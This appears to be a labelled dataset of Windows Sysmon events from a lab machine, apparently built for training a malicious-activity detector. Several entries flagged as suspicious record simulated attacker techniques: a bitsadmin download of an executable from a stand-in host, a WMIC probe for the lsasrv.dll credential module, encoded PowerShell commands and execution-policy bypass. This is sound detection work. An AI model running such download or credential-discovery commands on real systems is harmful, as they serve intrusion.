File created: RuleName: DLL UtcTime: 2025-11-27 14:57:36.839 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Program Files\WindowsApps\Microsoft.Windows.DevHome_0.2100.858.0_x64__8wekyb3d8bbwe\nb-NO\WindowsAdvancedSettings.resources.dll CreationUtcTime: 2025-11-27 14:57:36.839 User: NT AUTHORITY\SYSTEM,0
File created: RuleName: - UtcTime: 2025-11-27 18:10:16.235 ProcessGuid: {3a35410f-9405-6928-0a16-000000000b00} ProcessId: 18316 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_iltpqrkn.5es.ps1 CreationUtcTime: 2025-11-27 18:10:16.235 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:00:55.636 ProcessGuid: {3a35410f-91d7-6928-e90d-000000000b00} ProcessId: 3468 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -NoProfile -ExecutionPolicy Bypass -Command Write-Output 'PS 121'; Start-Sleep -Seconds 1 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:33.915 ProcessGuid: {3a35410f-8ab9-6928-7907-000000000b00} ProcessId: 10732 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\CLSID\{5AB7172C-9C11-405C-8DD5-AF20F3606282}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\FileSyncShell64.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:06:23.947 ProcessGuid: {3a35410f-931f-6928-ba14-000000000b00} ProcessId: 7476 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process call create 'tasklist /m lsasrv.dll' CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: DLL UtcTime: 2025-11-27 15:17:00.461 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Program Files\WindowsApps\Microsoft.WindowsAppRuntime.1.2_2000.802.31.0_x64__8wekyb3d8bbwe\DwmSceneI.dll CreationUtcTime: 2025-11-27 15:17:00.460 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:58.769 ProcessGuid: {3a35410f-928e-6928-7911-000000000b00} ProcessId: 14196 Image: C:\Windows\System32\schtasks.exe FileVersion: 10.0.19041.5965 (WinBuild.160101.0800) Description: Task Scheduler Configuration Tool Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: schtasks.exe CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask10 /f CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:58:02.328 ProcessGuid: {3a35410f-912a-6928-240a-000000000b00} ProcessId: 15224 Image: C:\Windows\System32\certutil.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: CertUtil.exe Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: ""C:\Windows\system32\certutil.exe"" -hashfile C:\Windows\win.ini SHA256 CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=E6384AD54B07F9783135586C71F82D1C,SHA256=FD1670B43E2D9188B12B233780BF043C5A90A67A2C6E3FCDC564A5C246531BC2,IMPHASH=5AFC8346D5AFF4A4862E8A7C91042465 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:46:34.982 ProcessGuid: {3a35410f-8e7a-6928-0908-000000000b00} ProcessId: 11424 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_j0xplpda.5q3.ps1 CreationUtcTime: 2025-11-27 17:46:34.982 User: DESKTOP-EJG8QJC\Emil Jinu,1
Dns query: RuleName: - UtcTime: 2025-11-27 15:05:01.071 ProcessGuid: {3a35410f-6569-6928-3700-000000000b00} ProcessId: 2460 QueryName: DESKTOP-EJG8QJC QueryStatus: 0 QueryResults: ::1; Image: C:\Windows\System32\spoolsv.exe User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:28:16.958 ProcessGuid: {3a35410f-8a30-6928-4707-000000000b00} ProcessId: 6376 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=utility --utility-sub-type=chrome.mojom.ProcessorMetrics --lang=en-US --service-sandbox-type=none --metrics-shmem-handle=5260,i,9052987831737703098,9732218141923845655,524288 --field-trial-handle=2096,i,2867188395102232837,17594691157158918554,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708994745248135 --mojo-platform-channel-handle=5264 /prefetch:8 CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-8a2d-6928-3e07-000000000b00} ParentProcessId: 128 ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
File created: RuleName: - UtcTime: 2025-11-27 17:57:47.794 ProcessGuid: {3a35410f-9118-6928-c309-000000000b00} ProcessId: 6796 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_jpae231b.yl3.ps1 CreationUtcTime: 2025-11-27 17:57:47.794 User: DESKTOP-EJG8QJC\Emil Jinu,1
File created: RuleName: EXE UtcTime: 2025-11-27 15:08:48.010 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Program Files\WindowsApps\Microsoft.OutlookForWindows_1.2025.1007.0_x64__8wekyb3d8bbwe\olkFullTrustExecutor.exe CreationUtcTime: 2025-11-27 15:08:48.010 User: NT AUTHORITY\SYSTEM,0
"Process Create: RuleName: - UtcTime: 2025-11-27 15:39:44.974 ProcessGuid: {3a35410f-70c0-6928-6e04-000000000b00} ProcessId: 6572 Image: C:\Windows\System32\svchost.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: Host Process for Windows Services Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: svchost.exe CommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=3D1034D6ED3DAED60816A25C561E8C83,SHA256=B0B36BFF7AE4057F687D839CD4B3D81159AB646F1EE1B22106A927E93DECBB61,IMPHASH=F9BBD96FAE53B7A31264A703CAFA0666 ParentProcessGuid: {3a35410f-6567-6928-0b00-000000000b00} ParentProcessId: 708 ParentImage: C:\Windows\System32\services.exe ParentCommandLine: C:\Windows\system32\services.exe ParentUser: NT AUTHORITY\SYSTEM",0
Network connection detected: RuleName: - UtcTime: 2025-11-27 17:53:47.319 ProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ProcessId: 4396 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe User: DESKTOP-EJG8QJC\Emil Jinu Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 10.0.2.15 SourceHostname: DESKTOP-EJG8QJC SourcePort: 56978 SourcePortName: - DestinationIsIpv6: false DestinationIp: 8.8.8.8 DestinationHostname: dns.google DestinationPort: 443 DestinationPortName: https,1
File created: RuleName: - UtcTime: 2025-11-27 18:04:54.473 ProcessGuid: {3a35410f-92c4-6928-ee12-000000000b00} ProcessId: 15220 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_tqiw0vyg.noe.ps1 CreationUtcTime: 2025-11-27 18:04:54.473 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:03:59.717 ProcessGuid: {3a35410f-928f-6928-8a11-000000000b00} ProcessId: 13268 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=21 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11543740153 --metrics-shmem-handle=7472,i,10019130779319570915,736186386430582275,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709005989750323 --mojo-platform-channel-handle=7488 /prefetch:1 CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00} ParentProcessId: 11048 ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1 ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Dns query: RuleName: - UtcTime: 2025-11-27 17:10:41.991 ProcessGuid: {3a35410f-81a2-6928-9d05-000000000b00} ProcessId: 11660 QueryName: factotum196p963.m-w.com QueryStatus: 0 QueryResults: type: 5 prod-factotum-lb-822175685.us-east-1.elb.amazonaws.com;54.83.152.165;50.19.248.129; Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe User: DESKTOP-EJG8QJC\Emil Jinu,0
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:21.697 ProcessGuid: {3a35410f-8aad-6928-6d07-000000000b00} ProcessId: 668 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{20894375-46AE-46E2-BAFD-CB38975CDCE6}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:04:49.623 ProcessGuid: {3a35410f-92c1-6928-d012-000000000b00} ProcessId: 1748 Image: C:\Windows\System32\bitsadmin.exe FileVersion: 7.8.19041.1 (WinBuild.160101.0800) Description: BITS administration utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: bitsadmin.exe CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job25 http://example.com/file.exe C:\Temp\file25.exe CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:06:42.456 ProcessGuid: {3a35410f-9332-6928-3715-000000000b00} ProcessId: 6100 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAE4AYQBtAGUA CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 18:00:08.354 ProcessGuid: {3a35410f-91a4-6928-db0c-000000000b00} ProcessId: 6336 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_w1yzljbb.eey.ps1 CreationUtcTime: 2025-11-27 18:00:08.354 User: DESKTOP-EJG8QJC\Emil Jinu,1
File created: RuleName: - UtcTime: 2025-11-27 17:49:26.470 ProcessGuid: {3a35410f-8f26-6928-7108-000000000b00} ProcessId: 1880 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_24v5jd4z.yfc.ps1 CreationUtcTime: 2025-11-27 17:49:26.470 User: DESKTOP-EJG8QJC\Emil Jinu,1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:05:01.639 ProcessGuid: {3a35410f-92cd-6928-3513-000000000b00} ProcessId: 3580 Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe FileVersion: 142.1.84.141 Description: Brave Browser Product: Brave Browser Company: Brave Software, Inc. OriginalFileName: brave.exe CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=44 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11592726598 --metrics-shmem-handle=4236,i,7059660960368215473,4953253393453775843,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190709027541712850 --mojo-platform-channel-handle=8824 /prefetch:1 CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Low Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00} ParentProcessId: 11048 ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1 ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 18:00:35.965 ProcessGuid: {3a35410f-91c3-6928-770d-000000000b00} ProcessId: 7124 Image: C:\Windows\System32\cmd.exe FileVersion: 10.0.19041.4355 (WinBuild.160101.0800) Description: Windows Command Processor Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: Cmd.Exe CommandLine: ""C:\Windows\system32\cmd.exe"" /c echo proc 111 & timeout /t 1 >nul CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18 ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
"Process Create: RuleName: - UtcTime: 2025-11-27 17:20:06.438 ProcessGuid: {3a35410f-8846-6928-cd06-000000000b00} ProcessId: 10516 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe FileVersion: 25.209.1026.0002 Description: Microsoft OneDrive Product: Microsoft OneDrive Company: Microsoft Corporation OriginalFileName: OneDrive.exe CommandLine: ""C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=DDBB2A7A1BA434259B7609DF9C7510A4,SHA256=E00A94C9A23BA34212D40192999BE4B761B2D27F4EA07BDC5A414C949DB79655,IMPHASH=9B64999A42FEBC0CB20DB21F6621FC6F ParentProcessGuid: {3a35410f-83b4-6928-2006-000000000b00} ParentProcessId: 12920 ParentImage: C:\Windows\explorer.exe ParentCommandLine: explorer.exe ParentUser: DESKTOP-EJG8QJC\Emil Jinu",0
"Process Create: RuleName: - UtcTime: 2025-11-27 17:30:41.788 ProcessGuid: {3a35410f-8ac1-6928-8707-000000000b00} ProcessId: 14364 Image: C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe FileVersion: 1.3.361.151 Description: BraveSoftware Update Product: BraveSoftware Update Company: BraveSoftware Inc. OriginalFileName: BraveUpdate.exe CommandLine: ""C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe"" /ua /installsource scheduler CurrentDirectory: C:\Windows\system32\ User: NT AUTHORITY\SYSTEM LogonGuid: {3a35410f-6567-6928-e703-000000000000} LogonId: 0x3E7 TerminalSessionId: 0 IntegrityLevel: System Hashes: MD5=C5FAF4E83ABA42AD45DD426C8A92A967,SHA256=D0928174E5F6E2175E98BCF74AD06F7BFD500AE7FADE166815036C9D83267C49,IMPHASH=703FF56BDEEA42466C9707ED3F98C291 ParentProcessGuid: {3a35410f-6568-6928-2400-000000000b00} ParentProcessId: 1532 ParentImage: C:\Windows\System32\svchost.exe ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule ParentUser: NT AUTHORITY\SYSTEM",0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:10:26.757 ProcessGuid: {3a35410f-9412-6928-6316-000000000b00} ProcessId: 13604 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe FileVersion: 10.0.19041.3996 (WinBuild.160101.0800) Description: Windows PowerShell Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: PowerShell.EXE CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAEUAMgAzACcA CurrentDirectory: C:\Users\Emil Jinu\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-c9e6-200000000000} LogonId: 0x20E6C9 TerminalSessionId: 1 IntegrityLevel: Medium Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6 ParentProcessGuid: {3a35410f-93eb-6928-6715-000000000b00} ParentProcessId: 6344 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
Registry value set: RuleName: T1122 EventType: SetValue UtcTime: 2025-11-27 17:30:20.362 ProcessGuid: {3a35410f-8aab-6928-6707-000000000b00} ProcessId: 1236 Image: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\OneDrive.exe TargetObject: HKU\S-1-5-21-3351607045-2108423416-1727308141-1001_Classes\WOW6432Node\CLSID\{82CA8DE3-01AD-4CEA-9D75-BE4C51810A9E}\InprocServer32\(Default) Details: C:\Users\Emil Jinu\AppData\Local\Microsoft\OneDrive\25.209.1026.0002\i386\FileSyncShell.dll User: DESKTOP-EJG8QJC\Emil Jinu,0
"Process Create: RuleName: - UtcTime: 2025-11-27 18:01:36.201 ProcessGuid: {3a35410f-9200-6928-9a0e-000000000b00} ProcessId: 132 Image: C:\Windows\System32\wbem\WMIC.exe FileVersion: 10.0.19041.5794 (WinBuild.160101.0800) Description: WMI Commandline Utility Product: Microsoft? Windows? Operating System Company: Microsoft Corporation OriginalFileName: wmic.exe CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" process list brief CurrentDirectory: C:\Windows\system32\ User: DESKTOP-EJG8QJC\Emil Jinu LogonGuid: {3a35410f-6604-6928-9de6-200000000000} LogonId: 0x20E69D TerminalSessionId: 1 IntegrityLevel: High Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00} ParentProcessId: 4396 ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ParentUser: DESKTOP-EJG8QJC\Emil Jinu",1
File created: RuleName: - UtcTime: 2025-11-27 17:59:14.158 ProcessGuid: {3a35410f-916d-6928-ed0b-000000000b00} ProcessId: 2444 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_pyivglrv.f2y.ps1 CreationUtcTime: 2025-11-27 17:59:14.158 User: DESKTOP-EJG8QJC\Emil Jinu,1
File created: RuleName: EXE UtcTime: 2025-11-27 15:18:24.064 ProcessGuid: {3a35410f-656d-6928-5500-000000000b00} ProcessId: 720 Image: C:\Windows\system32\svchost.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Microsoft\WindowsApps\Spotify.exe CreationUtcTime: 2025-11-27 15:18:24.064 User: NT AUTHORITY\SYSTEM,0
File created: RuleName: - UtcTime: 2025-11-27 18:00:47.501 ProcessGuid: {3a35410f-91cc-6928-a50d-000000000b00} ProcessId: 7440 Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_vgox2lfu.bo3.ps1 CreationUtcTime: 2025-11-27 18:00:47.501 User: DESKTOP-EJG8QJC\Emil Jinu,1
